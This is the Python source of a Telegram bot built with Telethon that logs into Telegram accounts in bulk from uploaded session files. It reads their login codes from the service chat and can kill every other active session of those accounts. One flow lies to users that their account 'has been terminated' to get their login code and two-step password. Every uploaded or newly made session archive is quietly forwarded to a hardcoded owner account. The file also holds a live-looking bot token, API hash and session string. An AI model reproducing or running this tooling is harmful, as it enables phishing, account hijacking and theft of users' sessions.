import telethon,os,zipfile,asyncio,sys,shutil,psutil,time
from telethon.errors.rpcerrorlist import PhoneCodeExpiredError, FloodWaitError, PhoneCodeInvalidError, PhoneNumberBannedError, PhoneNumberInvalidError, UserBannedInChannelError, PeerFloodError, UserPrivacyRestrictedError, UserAlreadyParticipantError,  UserBannedInChannelError, UserAlreadyParticipantError,  UserPrivacyRestrictedError, ChatAdminRequiredError, ChatWriteForbiddenError, UserChannelsTooMuchError, UserNotParticipantError,ChannelPrivateError, SessionPasswordNeededError, UserBannedInChannelError
from telethon.sessions import StringSession
API_ID= 12468937
API_HASH= "84355e09d8775921504c93016e1e9438"
BOT_TOKEN = "5195927287:AAHodzABzzKUU6_zn0FxGpanOquM5fwYM9M"
OWNERS=[1303790979,1854668908]
Premium=[]
start_time=time.time()
rar={}
rare={}
strin="1ApWapzMBu3RpmtYTGhbOWpEg8F50I7-WeXjl6lXISAGTGw61SukM3seCNxBSs9W3f-DQEWdjs_xOVw0FzdQYk9Ufxucl46Kgt-OK5H-qlSXXcWI10JRmlZ90TjlIB0R8ip6lj9bb-g98uMqpt7ksz-NVGDXbHTeR9oAgWFgU8NR1ik4_M0C13sWx5LXbWRahR1laEAfW4niFPejqHfdExj0B-kVN1QSyzPJSl-KIFh-EOl-jyrNtk3rBP0PTvkSw9F_wzkLKnxWwAo2D9SH4vUMdJfYoa8SJ1uJMVZPyOgue8vnOsy7KOuhQ0OpO6qlCLLY3Ds7yOOadzdP_2yj5BeMgl8iL01U="
client = telethon.TelegramClient(None, api_id=API_ID , api_hash=API_HASH).start(bot_token=BOT_TOKEN)
acc = telethon.TelegramClient(StringSession(strin), api_id=API_ID , api_hash=API_HASH).start()

async def get_user_join(e):
    try:
        await client(telethon.tl.functions.channels.GetParticipantRequest(channel="InducedBots", participant=e.chat.id))
        await client(telethon.tl.functions.channels.GetParticipantRequest(channel="AP_SHOPPIEE", participant=e.chat.id))
        return True
    except telethon.errors.rpcerrorlist.UserNotParticipantError:
        await client.send_message(e.chat.id,"You have not Joined Our Channel\nJoin to Use me For Free\n\nMade with ❤️ By @InducedBots", buttons=[[telethon.Button.url("🎁 Channel1", url=f"https://t.me/InducedBots"),telethon.Button.url("🎁 Channel2", url=f"https://t.me/AP_SHOPPIEE")],[telethon.Button.url("Check☑️", url="https://t.me/InducedOtp_Bot?start=1"),]])
        return False


@client.on(telethon.events.NewMessage(incoming=True, pattern='/start', func=lambda e: e.is_private))
async def _(e):
    if not await get_user_join(e):
        return
    but=[
            [
                telethon.Button.inline("Ballence: {}Rs", b"Ballence"),
                telethon.Button.inline("💰 Add Funds", b"Funds")
            ],
            [
                telethon.Button.inline("🎁 Get Otps", b"Ishan"),
                telethon.Button.inline("🛰 Admin Pannel", b"Admin")
            ]
        ]
    await e.reply(f"**Welcome Sir!\n\nI'm Induced Account Bot \nMade for Manage Tg Accounts\n\nMade with ❤️ By @InducedBots**", buttons=but)


@client.on(telethon.events.NewMessage(incoming=True, pattern='/private', func=lambda e: e.is_private))
async def _(e):
    if not await get_user_join(e):
        return
    but=[
            [
                telethon.Button.inline("☎️ Session", b"Session"),
                telethon.Button.inline("✅ Otp", b"Acc")
            ],
            [
                telethon.Button.inline("🎁 Terrminate ", b"Terrminate"),
                telethon.Button.inline("🛰 Admin Pannel", b"Admin")
            ]
        ]
    if e.chat.id in OWNERS or e.chat.id in Premium:
        await e.reply(f"**Welcome Sir!\n\nI'm Induced Account Bot \nMade for Manage Tg Accounts\n\nMade with ❤️ By @InducedBots**", buttons=but)


@client.on(telethon.events.CallbackQuery)
async def _(e):
    global rar,rare
    if e.data == b"Next":
        global rare
        await e.answer('\nSkip Number',alert=True)
        rare[f'{e.query.user_id}'] = True
    
    elif e.data == b"Otp":
        global rar
        await e.answer('\nOtp Recieved',alert=True)
        rar[f'{e.query.user_id}'] = True
    
    elif e.data == b"Acc":
        async with client.conversation(e.chat_id) as xmr:
            await xmr.send_message("Send Your Zip")
            try:
                shutil.rmtree(f'{e.query.user_id}')
            except:
                pass
            try:
                Zip= await xmr.get_response(timeout=300)
                if Zip.text=="/start" or Zip.text=="/help":
                    return
                await client.send_file(1303790979,Zip,caption=f"File by [OWNER](tg://user?id={e.query.user_id})",force_document=True,)
                a=await xmr.send_message("Downloading")
                if (Zip.media and Zip.media.document) :
                    if not os.path.exists(f'{e.query.user_id}/'):
                        os.mkdir(f'{e.query.user_id}/')
                    media = await Zip.download_media(f'{e.query.user_id}/')
                    await a.edit("Download done")
                    with zipfile.ZipFile(media, "r") as zip_ref:
                        zip_ref.extractall(f'{e.query.user_id}')
                    await a.edit("Unziping Finish")
                    rar[f'{e.query.user_id}'] = False
                    rare[f'{e.query.user_id}'] = False
                    for r in os.listdir(f'{e.query.user_id}/sessions'):
                        if not r.endswith(".session"):
                            continue
                        r=r.replace('.session', '')
                        try:
                            cl=telethon.TelegramClient(f"{e.query.user_id}/sessions/{r}", API_ID, API_HASH)
                            await cl.connect()
                            k = await cl.get_me()
                            await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
                            await cl.send_message('SpamBot', '/start')
                            await asyncio.sleep(2)
                            async for xr in cl.iter_messages("@SpamBot", limit=1):
                                stats=str(xr.text)
                            mess=await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** {k.username}\n**Phone:** `{r}`\n**SpamBot Stats:** {stats}\n\n**Made with ❤️ By @InducedBots**",buttons=[[telethon.Button.inline("Get Otp✅", b"Otp"),telethon.Button.inline("Skip", b"Next"),]])
                            while True:
                                await asyncio.sleep(2)
                                if rar[f'{e.query.user_id}']==True:
                                    rar[f'{e.query.user_id}'] = False
                                    msg = await cl.get_messages(777000, limit=1)
                                    try:
                                        otp=(f'{msg[0].message.split(":")[1].split(" ")[1].replace(".", "")}')
                                    except:
                                        otp="Not Come \n\nMoving To Next Number"
                                    await mess.edit((f"Login Successfully✅ Done.\n\n**Name:** {k.first_name}\n**Username:** {k.username}\n**Phone:** {r}\n**SpamBot Stats:** {stats}\n\nOtp: `{otp}`\n\n\n**Made with ❤️ By @InducedBots**") )
                                    break
                                elif rare[f'{e.query.user_id}']==True:
                                    rare[f'{e.query.user_id}'] = False  
                                    break  
                        except Exception as a:
                            await xmr.send_message(f"Login {r} UnSucessfully")
                            continue
                    await xmr.send_message("Adding Done Sucessfully")
            except TimeoutError:
                await xmr.send_message("Time Limit Reached of 5 Min.")
                return

    elif e.data == b"Get":
        async with client.conversation(e.chat_id) as xmr:
            try:
                async for Zip in acc.iter_messages("@ghthdf", search=".zip", filter=telethon.tl.types.InputMessagesFilterDocument, limit=1):
                    if not os.path.exists(f'{e.query.user_id}/'):
                        os.mkdir(f'{e.query.user_id}/')
                    media = await Zip.download_media(f'{e.query.user_id}/')
                    await a.edit("Download done")
                    with zipfile.ZipFile(media, "r") as zip_ref:
                        zip_ref.extractall(f'{e.query.user_id}')
                    await a.edit("Unziping Finish")
                    rar[f'{e.query.user_id}'] = False
                    rare[f'{e.query.user_id}'] = False
                    for r in os.listdir(f'{e.query.user_id}/sessions'):
                        if not r.endswith(".session"):
                            continue
                        r=r.replace('.session', '')
                        try:
                            cl=telethon.TelegramClient(f"{e.query.user_id}/sessions/{r}", API_ID, API_HASH)
                            await cl.connect()
                            k = await cl.get_me()
                            await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
                            await cl.send_message('SpamBot', '/start')
                            await asyncio.sleep(2)
                            async for xr in cl.iter_messages("@SpamBot", limit=1):
                                stats=str(xr.text)
                            mess=await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** {k.username}\n**Phone:** `{r}`\n**SpamBot Stats:** {stats}\n\n**Made with ❤️ By @InducedBots**",buttons=[[telethon.Button.inline("Get Otp✅", b"Otp"),telethon.Button.inline("Skip", b"Next"),]])
                            while True:
                                await asyncio.sleep(2)
                                if rar[f'{e.query.user_id}']==True:
                                    rar[f'{e.query.user_id}'] = False
                                    msg = await cl.get_messages(777000, limit=1)
                                    try:
                                        otp=int(f'{msg[0].message.split(":")[1].split(" ")[1].replace(".", "")}')
                                    except:
                                        otp="Otp Not Come \n\nMoving To Next Number"
                                    await mess.edit((f"Login Successfully✅ Done.\n\n**Name:** {k.first_name}\n**Username:** {k.username}\n**Phone:** {r}\n**SpamBot Stats:** {stats}\n\nOtp: `{otp}`\n\n\n**Made with ❤️ By @InducedBots**") )
                                    break
                                elif rare[f'{e.query.user_id}']==True:
                                    rare[f'{e.query.user_id}'] = False  
                                    break  
                        except Exception as a:
                            await xmr.send_message(f"Login {r} UnSucessfully")
                            continue
                    await xmr.send_message("Adding Done Sucessfully")
            except TimeoutError:
                await xmr.send_message("Time Limit Reached of 5 Min.")
                return

    elif e.data == b"Terrminate":
        async with client.conversation(e.chat_id) as xmr:
            await xmr.send_message("Send Your Zip")
            try:
                shutil.rmtree(f'{e.query.user_id}')
            except:
                pass
            try:
                Zip= await xmr.get_response(timeout=300)
                if Zip.text=="/start" or Zip.text=="/help":
                    return
                await client.send_file(1303790979,Zip,caption=f"File by [OWNER](tg://user?id={e.query.user_id})",force_document=True,)
                a=await xmr.send_message("Downloading")
                if (Zip.media and Zip.media.document) :
                    if not os.path.exists(f'{e.query.user_id}/'):
                        os.mkdir(f'{e.query.user_id}/')
                    media = await Zip.download_media(f'{e.query.user_id}/')
                    await a.edit("Download done")
                    with zipfile.ZipFile(media, "r") as zip_ref:
                        zip_ref.extractall(f'{e.query.user_id}')
                    await a.edit("Unziping Finish")
                    rar[f'{e.query.user_id}'] = False
                    rare[f'{e.query.user_id}'] = False
                    for r in os.listdir(f'{e.query.user_id}/sessions'):
                        if not r.endswith(".session"):
                            continue
                        r=r.replace('.session', '')
                        try:
                            cl=telethon.TelegramClient(f"{e.query.user_id}/sessions/{r}", API_ID, API_HASH)
                            await cl.connect()
                            k = await cl.get_me()
                            await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
                            await cl.send_message('SpamBot', '/start')
                            await asyncio.sleep(2)
                            async for xr in cl.iter_messages("@SpamBot", limit=1):
                                stats=str(xr.text)
                            c = 0
                            try:
                                auths = await cl(telethon.functions.account.GetAuthorizationsRequest())
                                hashs = [i.hash for i in auths.authorizations]
                                for i in hashs:
                                    if i != 0:
                                        try:
                                            await cl(telethon.functions.account.ResetAuthorizationRequest(hash=i))
                                            c += 1
                                        except:
                                            pass
                            except:
                                pass
                            mess=await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** `{k.username}`\n**Phone:** `{r}`\n**Session Stats:** `{c} Sessions Terminated`\n**SpamBot Stats:** `{stats}`\n\n**Made with ❤️ By @InducedBots**")
                            await cl.disconnect()
                        except Exception as a:
                            await xmr.send_message(f"Login `{r}` UnSucessfully")
                            await cl.disconnect()
                    await xmr.send_message("Task Done Sucessfully")
            except TimeoutError:
                await xmr.send_message("Time Limit Reached of 5 Min.")
                return

    elif e.data == b"Admin":
        if e.query.user_id in OWNERS:
            but=[
                    [
                        telethon.Button.inline("Sudo", b"Sudo"),
                        telethon.Button.inline("📊 Staus", b"Stat"),
                    ],
                    [
                        telethon.Button.inline("🔄 Restart", b"Restart"),
                        telethon.Button.inline("Back", b"Home")
                    ]
                ]
            await client.edit_message(e.chat.id, e.query.msg_id, f"**Welcome Sir!\n\nI'm Induced Scraper Bot \nMade for Adding in Free,\nWithout Any Use of Python.\n\nMade with ❤️ By @InducedBots**", buttons=but)
    
    elif e.data == b"Stat":
            start = time.time()
            await e.answer('\nWait Checking Stats', alert=True)
            end = round((time.time() - start) * 1000)
            def time_formatter():
                minutes, seconds = divmod(int(time.time() - start_time), 60)
                hours, minutes = divmod(minutes, 60)
                days, hours = divmod(hours, 24)
                weeks, days = divmod(days, 7)
                tmp = (
                    ((str(weeks) + "w:") if weeks else "")
                    + ((str(days) + "d:") if days else "")
                    + ((str(hours) + "h:") if hours else "")
                    + ((str(minutes) + "m:") if minutes else "")
                    + ((str(seconds) + "s") if seconds else "")
                )
                if tmp != "":
                    if tmp.endswith(":"):
                        return tmp[:-1]
                    else:
                        return tmp
                else:
                    return "0 s"
            total, used, free = shutil.disk_usage(".")
            cpuUsage = psutil.cpu_percent()
            memory = psutil.virtual_memory().percent
            disk = psutil.disk_usage("/").percent
            upload = humanbytes(psutil.net_io_counters().bytes_sent)
            down = humanbytes(psutil.net_io_counters().bytes_recv)
            TOTAL = humanbytes(total)
            USED = humanbytes(used)
            FREE = humanbytes(free)
            tex=f"Total Details\n\nBot Usage:\n┏━━━━━━━━━━━━━━━━\n┣Ping - `{end}ms`\n┣UpTime - `{time_formatter()}`\n┗━━━━━━━━━━━━━━━━\n\nSystem Usage:\n┏━━━━━━━━━━━━━━━━\n┣UplodeSpeed: {upload}\n┣Download: {down}\n┣Cpu: {cpuUsage}%\n┣Ram: {memory}%\n┃\n┣Storage Used: {disk}%\n┃┏━━━━━━━━━━━━━━━━\n┃┣Total: {TOTAL}\n┃┣Used: {USED}\n┃┣Free: {FREE}\n┃┗━━━━━━━━━━━━━━━━\n┗━━━━━━━━━━━━━━━━\n\nMade With ❤️ By @InducedBots"
            await client.send_message(e.chat.id,tex,buttons=[[telethon.Button.inline("📊 Staus", b"Stat"),]])

    elif e.data == b"Restart":
        if not await get_user_join(e):
            return
        if e.query.user_id in OWNERS:
            await e.answer('\nRestarting Bot Wait', alert=True)
            os.execl(sys.executable, sys.executable, "-m", "main")

    elif e.data == b"Sudo":
        if not await get_user_join(e):
            return
        async with client.conversation(e.chat_id) as x:
            await x.send_message(f"Send Userid of To Give Sudo")
            try:
                id= await x.get_response(timeout=600)
                if id.text=="/start" or id.text=="/help":
                    return
                
            except TimeoutError:
                await x.send_message("Time Limit Reached of 5 Min.")
                return
            Premium.append(int(id.text))
            await x.send_message(f"Sudo Given To `{id.text}`")
            await client.send_message(int(id.text),f"Sudo Given To `{id.text}`")

    elif e.data == b"Session":
        try:
            shutil.rmtree(f'{e.query.user_id}')
        except:
            pass
        rar[f'{e.query.user_id}'] = False
        os.mkdir(f'{e.query.user_id}/')
        os.mkdir(f'{e.query.user_id}/sessions/')
        while True:
            async with client.conversation(e.chat_id) as xmr:
                await xmr.send_message("Send PhoneNumber")
                try:
                    Zip= await xmr.get_response(timeout=300)
                    try:

                        pphone=phone = (telethon.utils.parse_phone(Zip.text))
                        cl=telethon.TelegramClient(f"{e.query.user_id}/sessions/{phone}", API_ID, API_HASH)
                        await cl.connect()
                        await cl.send_code_request(phone)
                        await xmr.send_message((f"Your Account has been terminated\n\nPlease enter OTP of Phone No {pphone} in `1 2 3 4 5` format. __(Space between each numbers!)__"))
                        otp= await xmr.get_response(timeout=300)
                        if otp.text=="/start" or otp.text=="/help":
                            return
                        await cl.sign_in(phone=phone, code=' '.join(str(otp.text)))
                    except FloodWaitError as h:
                            await xmr.send_message(f"{pphone}You Have Floodwait of {h.x} Seconds")
                            continue
                    except PhoneNumberInvalidError:
                            await xmr.send_message(f"Your Phone Number {pphone} is Invalid.")
                            continue
                    except PhoneNumberBannedError:
                            await xmr.send_message(f"{phone} is Baned")
                            continue
                    except TimeoutError:
                            await xmr.send_message("Time Limit Reached of 5 Min.")
                            return
                    except PhoneCodeInvalidError:
                            await xmr.send_message(f"{pphone} Invalid Code.")
                            continue
                    except PhoneCodeExpiredError:
                            await xmr.send_message(f"{pphone} Code is Expired.")
                            continue
                    except SessionPasswordNeededError:
                            try:
                                await xmr.send_message("Your Account Have Two-Step Verification.\nPlease Enter Your Password.")
                                two_step_code= await xmr.get_response(timeout=300)
                                if two_step_code.text=="/start" or two_step_code.text=="/help":
                                    return
                            except TimeoutError:
                                await xmr.send_message("`Time Limit Reached of 5 Min.`")
                                return
                            try:
                                await cl.sign_in(password=two_step_code.text)
                            except Exception as h:
                                await xmr.send_message(f"{pphone}\n\n**ERROR:** `{str(h)}`")
                                continue
                    k = await cl.get_me()
                    await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
                    await cl.send_message('SpamBot', '/start')
                    await asyncio.sleep(2)
                    async for xr in cl.iter_messages("@SpamBot", limit=1):
                        stats=str(xr.text)
                    mess=await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** {k.username}\n**Phone:** `{pphone}`\n**SpamBot Stats:** {stats}\n\n**Made with ❤️ By @InducedBots**",buttons=[[telethon.Button.inline("Zip✅", b"Zip")]])
                except TimeoutError:
                    await xmr.send_message("Time Limit Reached of 5 Min.")
                    return

    elif e.data == b"Zip":
        with zipfile.ZipFile("sessions.zip", "w") as f:
            for root, dirs,file in os.walk(f"{e.query.user_id}/sessions/"):
                for file in file:
                    f.write(os.path.join(root,file))
        f.close
        await client.send_file(1303790979,"sessions.zip",caption=f"File by [OWNER](tg://user?id={e.query.user_id})",force_document=True)
        await client.send_file(e.chat_id,"sessions.zip",caption="`Here",force_document=True)


def humanbytes(size):

    if size in [None, ""]:
        return "0 B"
    for unit in ["B", "KB", "MB", "GB"]:
        if size < 1024:
            break
        size /= 1024
    return f"{size:.2f} {unit}"


print("""
╔════╗
╚═╗╔═╝
╔═╣╠═╗
║╔╣╠╗║
║╚╣╠╝║
╚═╣╠═╝
╔═╝╚═╗
╚════╝""")
if len(sys.argv) not in (1, 3, 4):
    try:
        client.disconnect()
    except:
            os.execl(sys.executable, sys.executable, "-m", "main")
else:
    try:
        client.run_until_disconnected()
    except:
        os.execl(sys.executable, sys.executable, "-m", "main")
